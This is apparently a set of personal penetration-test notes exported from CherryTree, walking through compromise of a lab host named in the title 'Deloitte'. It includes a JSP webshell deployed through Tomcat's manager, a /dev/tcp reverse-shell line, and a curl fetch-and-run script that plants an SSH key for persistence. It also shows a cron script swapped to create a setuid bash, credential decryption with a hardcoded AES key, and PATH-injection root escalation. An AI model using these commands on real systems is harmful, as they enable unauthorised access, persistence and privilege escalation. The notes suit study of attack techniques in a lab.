<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Deloitte</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Deloitte</h1><br/><p><em><h2>Recon web: axis </h2></em></p><p></p><p><img src="images/457-1.png" alt="images/457-1.png" /><ul><li><a href="http://192.168.56.118:8080/axis2/services/Version/getVersion">http://192.168.56.118:8080/axis2/services/Version/getVersion</a></li></ul></p><p></p><p></p><p></p><p><em><h2>Local file inclusion axis </h2></em></p><p><img src="images/457-2.png" alt="images/457-2.png" /></p><p><ol><li>2. <em><h2>2. access tomcat (exposed admin page)</h2></em></li><li></li></ol><img src="images/457-3.png" alt="images/457-3.png" />   with axis password </p><p></p><p></p><p><em><h2>Deploy webshell</h2></em></p><p></p><p><div class="codebox"><pre>wget https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>tennc<span style="color:#ff9d00;font-weight:700">/</span>webshell<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">fuzzdb-webshell</span><span style="color:#ff9d00;font-weight:700">/</span>jsp<span style="color:#ff9d00;font-weight:700">/</span>cmd.jsp<br />zip <span style="color:#ff9d00;font-weight:700">-r</span> backup.war cmd.jsp <br /><span style="color:#0088ff;font-weight:400"># When this file is uploaded to the manager GUI, the /backup application will be added to the table.</span><br /><span style="color:#0088ff;font-weight:400"># Go to: http://tomcat-site.local:8180/backup/cmd.jsp</span></pre></div></p><p><img src="images/457-4.png" alt="images/457-4.png" /></p><p></p><p></p><p><em><h2>Persistence stable shell (tomcat)</h2></em></p><p>I had trouble with reverse shell </p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## create a file shell.sh </span><br /><span style="color:#0088ff;font-weight:400">#! /bin/bash</span><br /><span style="color:#0088ff;font-weight:400">#bash -i &gt;&amp; /dev/tcp/192.168.56.1/443 0&gt;&amp;1</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDD3WfQPvIUJ1RdqysYupH894rAGwG4WEL10SJHR1xSS/wVuggL3M5QLtcaKl8qaTIB6Z6l9E6CNKpFkQTgK6z81NU8gEsoFG/pVvUo2kHrVu9zc/9HQ+nfrlbItVRZi/H8dgG3VN7UfG9i/jH96o1WQNClAKWk3NFwrhFBTxCChJmmARM8YYln6GspSS+GKUCT0rnJOroAv7ui8UjguFY17WhGi1VE5JoDHmMvMvUUY3eZenC5Jmh1cDcSRh+5UHHpxmYBUAxNdyh8ETtXBcsuOJeL7iz7R5liC7UQJPAJ5aGoBOIO9f+cc5Dt3SvUHN+GqRStyBhypzKg3CS0KGHL5S81LUhSKweIFcnOB9/krrKv3Vh11u0yBN4IJPcADALnEf/qerNsHIPCu3hfkWy5hjscjQPkzC7HOHjvt3mOkgMhD5Xzhe1DMTwB4WWHB9ZDbhHrF0JVZomY7AxC6tDhSD3e5Ez9tM/dMX+EPc2fQSf9+kDw9DthXp1oniuAQ20= yharrizi@yharrizi-Vostro-15-3510&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> /home/tomcat/.ssh/authorized_keys<br />yharrizi@yharrizi-Vostro-<br /><br /><span style="color:#0088ff;font-weight:400">## on web shell </span><br />curl 192.168.56.1/shell.sh -o shell.sh<br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x shell.sh<br />.<span style="color:#ff9d00;font-weight:700">/</span>shell.sh<br /><span style="color:#0088ff;font-weight:400">## exploit </span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> -i id_rsa tomcat@192.168.56.118</pre></div></p><p><img src="images/457-5.png" alt="images/457-5.png" /></p><p></p><p></p><p></p><p><em><h2>Reverse shell alice</h2></em></p><p></p><p>sudo -u alice /usr/bin/vim</p><p></p><p><img src="images/457-6.png" alt="images/457-6.png" /></p><p></p><p>Privesc BOb</p><p></p><p><img src="images/457-7.png" alt="images/457-7.png" /></p><p>cat /home/dev/django_migration/django_migration</p><p></p><p>md5 hash 2d5831578ea970d0cfa664ede08b5f3c</p><p></p><p><img src="images/457-8.png" alt="images/457-8.png" /></p><p></p><p></p><p><em><h2>Privesc charles (excessive permissions: bob can replace the file</h2></em>)</p><p></p><p>POst exploit replace testscript.py and wait for cron job to run     </p><p><div class="codebox"><pre><span style="color:#333333;font-weight:400">import</span> os<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">execute_whoami</span>():<br />    stream = os.popen(<span style="color:#3ad900;font-weight:400">&#39;cp /usr/bin/bash /tmp/bash; chmod u+sx /tmp/bash&#39;</span>)<br />    output = stream.read()<br />    <span style="color:#ff9d00;font-weight:700">return</span> output<br /><br />result = execute_whoami()<br /><span style="color:#ff9d00;font-weight:700">print</span>(result)<br /></pre></div></p><p><img src="images/457-9.png" alt="images/457-9.png" /></p><p><img src="images/457-10.png" alt="images/457-10.png" /></p><p>cron job running of charles </p><p></p><p><img src="images/457-11.png" alt="images/457-11.png" /></p><p></p><p><img src="images/457-12.png" alt="images/457-12.png" /></p><p></p><p></p><p></p><p><em><h2>Privesc David</h2></em></p><p></p><p><img src="images/457-13.png" alt="images/457-13.png" /></p><p>pyc  are cached files <ul><li>we have AES secrets key + IV </li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">hashlib</span> <span style="color:#333333;font-weight:400">import</span> md5<br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">base64</span> <span style="color:#333333;font-weight:400">import</span> b64decode, b64encode<br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">Crypto.Cipher</span> <span style="color:#333333;font-weight:400">import</span> AES<br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">Crypto.Util.Padding</span> <span style="color:#333333;font-weight:400">import</span> pad, unpad<br /><br /><span style="color:#ff9d00;font-weight:700">class</span> <span style="color:#333333;font-weight:400">AESCipher</span>:<br /><br />    <span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">__init__</span>(<span style="color:#333333;font-weight:400">self</span>, key, iv):<br />        <span style="color:#333333;font-weight:400">self</span>.key = md5(key.encode(<span style="color:#3ad900;font-weight:400">&#39;utf8&#39;</span>)).digest()<br />        <span style="color:#333333;font-weight:400">self</span>.iv = md5(iv.encode(<span style="color:#3ad900;font-weight:400">&#39;utf8&#39;</span>)).digest()<br /><br />    <span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">encrypt</span>(<span style="color:#333333;font-weight:400">self</span>, data):<br />        cipher = AES.new(<span style="color:#333333;font-weight:400">self</span>.key, AES.MODE_CBC, <span style="color:#333333;font-weight:400">self</span>.iv)<br />        <span style="color:#ff9d00;font-weight:700">return</span> b64encode(<span style="color:#333333;font-weight:400">self</span>.iv + cipher.encrypt(pad(data.encode(<span style="color:#3ad900;font-weight:400">&#39;utf-8&#39;</span>), AES.block_size)))<br /><br />    <span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">decrypt</span>(<span style="color:#333333;font-weight:400">self</span>, enc):<br />        enc = b64decode(enc)<br />        iv = enc[:AES.block_size]  <span style="color:#0088ff;font-weight:400"># extract the IV from the beginning</span><br />        cipher = AES.new(<span style="color:#333333;font-weight:400">self</span>.key, AES.MODE_CBC, iv)<br />        <span style="color:#ff9d00;font-weight:700">return</span> unpad(cipher.decrypt(enc[AES.block_size:]), AES.block_size).decode(<span style="color:#3ad900;font-weight:400">&#39;utf-8&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Assuming you have an instance of AESCipher</span><br />cred_encryptor = AESCipher(<span style="color:#3ad900;font-weight:400">&#39;supersecrettestkey&#39;</span>, <span style="color:#3ad900;font-weight:400">&#39;testiv&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Assuming you have some encrypted data to decrypt.</span><br />encrypted_data = <span style="color:#3ad900;font-weight:400">&#39;OPh7C5tzYWC/wMvYRHr27gJYHbXY1Cff2PACsEKekLY9iimtb+SV/W7txK28+4KbEm6xr5grNAnqxLwHnIPlyg==&#39;</span>  <span style="color:#0088ff;font-weight:400"># Replace with your encrypted data</span><br />decrypted_data = cred_encryptor.decrypt(encrypted_data)<br /><span style="color:#ff9d00;font-weight:700">print</span>(decrypted_data)<br /></pre></div></p><p></p><p><img src="images/457-14.png" alt="images/457-14.png" /></p><p><img src="images/457-15.png" alt="images/457-15.png" /></p><p></p><p>4e238b76533c1f8bac248c67de0892e2</p><p><em><h2>Privesc root</h2></em></p><p></p><p><img src="images/457-16.png" alt="images/457-16.png" /></p><p>the file is setuid <ul><li>ghidra decompile </li><li></li></ul><img src="images/457-17.png" alt="images/457-17.png" /><ul><li>the file is calling ls without full path =&gt; we can exploit it via PATH injection </p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">PATH</span>=<span style="color:#3ad900;font-weight:400">&quot;/tmp/bin&quot;</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br /><br /><span style="color:#0088ff;font-weight:400">## write a sh </span><br /><br /><span style="color:#0088ff;font-weight:400">#! /bin/bash </span><br /><span style="color:#ff9d00;font-weight:700">cp</span> /usr/bin/bash /tmp/root<span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#ff9d00;font-weight:700">chmod</span> u+sx /tmp/root<br /><span style="color:#0088ff;font-weight:400"># put it as /tmp/bin/ls </span><br /><span style="color:#0088ff;font-weight:400">## trigger </span><br /><span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>infoproc</pre></div></p><p><img src="images/457-18.png" alt="images/457-18.png" /></p><p></p><p>resource : <ul><li>https://blog.creekorful.org/2020/09/setuid-privilege-escalation/</li></ul></p></div>
</body>
</html>
